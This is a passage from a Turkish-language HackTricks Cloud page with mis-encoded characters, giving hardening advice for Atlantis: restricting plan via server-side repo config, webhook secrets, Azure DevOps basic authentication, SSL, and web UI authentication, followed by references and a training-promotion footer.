3. [Sunucu tarafÄ± repo yapÄ±landÄ±rmanÄ±zÄ±](https://www.runatlantis.io/docs/server-side-repo-config.html) `plan` adÄ±mÄ±nÄ± yasaklayacak ÅŸekilde deÄŸiÅŸtirin, yasaklÄ± saÄŸlayÄ±cÄ±larÄ±n veya veri kaynaklarÄ±nÄ±n kullanÄ±mÄ±nÄ± doÄŸrulayÄ±n veya izin verilmeyen kullanÄ±cÄ±lardan gelen PR'leri reddedin. Bu noktada ek doÄŸrulama ekleyebilirsiniz, Ã¶rneÄŸin `plan`'Ä±n devam etmesine izin vermeden Ã¶nce PR'a "thumbs-up" gerektirebilirsiniz. Conftest burada kullanÄ±ÅŸlÄ± olabilir.

### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis, `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ortam deÄŸiÅŸkenleri aracÄ±lÄ±ÄŸÄ±yla ayarlanmÄ±ÅŸ Webhook secret'Ä± ile Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r. `--repo-allowlist` bayraÄŸÄ± ayarlanmÄ±ÅŸ olsa bile, webhook secret olmadan saldÄ±rganlar, izin verilen bir depo gibi davranarak Atlantis'a isteklerde bulunabilir. Webhook secret'lar, webhook isteklerinin gerÃ§ekten VCS saÄŸlayÄ±cÄ±nÄ±zdan (GitHub veya GitLab) geldiÄŸini saÄŸlar.

Azure DevOps kullanÄ±yorsanÄ±z, webhook secret'lar yerine temel bir kullanÄ±cÄ± adÄ± ve ÅŸifre ekleyin.

### Azure DevOps Temel Kimlik DoÄŸrulamasÄ± <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps, tÃ¼m webhook etkinliklerinde temel kimlik doÄŸrulama baÅŸlÄ±ÄŸÄ± gÃ¶ndermeyi destekler. Webhook konumunuz iÃ§in bir HTTPS URL kullanmanÄ±zÄ± gerektirir.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Webhook secret'larÄ±nÄ± kullanÄ±yorsanÄ±z ancak trafiÄŸiniz HTTP Ã¼zerinden ise, webhook secret'lar Ã§alÄ±nabilir. `--ssl-cert-file` ve `--ssl-key-file` bayraklarÄ±nÄ± kullanarak SSL/HTTPS'yi etkinleÅŸtirin.

### Atlantis Web Sunucusunda Kimlik DoÄŸrulamasÄ±nÄ± EtkinleÅŸtirme <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Web hizmetinde kimlik doÄŸrulamasÄ±nÄ± etkinleÅŸtirmek Ã§ok Ã¶nerilir. `--web-basic-auth=true` kullanarak BasicAuth'i etkinleÅŸtirin ve `--web-username=yourUsername` ve `--web-password=yourPassword` bayraklarÄ±yla bir kullanÄ±cÄ± adÄ± ve ÅŸifre belirleyin.

BunlarÄ± ayrÄ±ca ortam deÄŸiÅŸkenleri olarak geÃ§irebilirsiniz `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` ve `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Referanslar

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github depolarÄ±na PR gÃ¶ndererek hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸÄ±n.

</details>
{% endhint %}
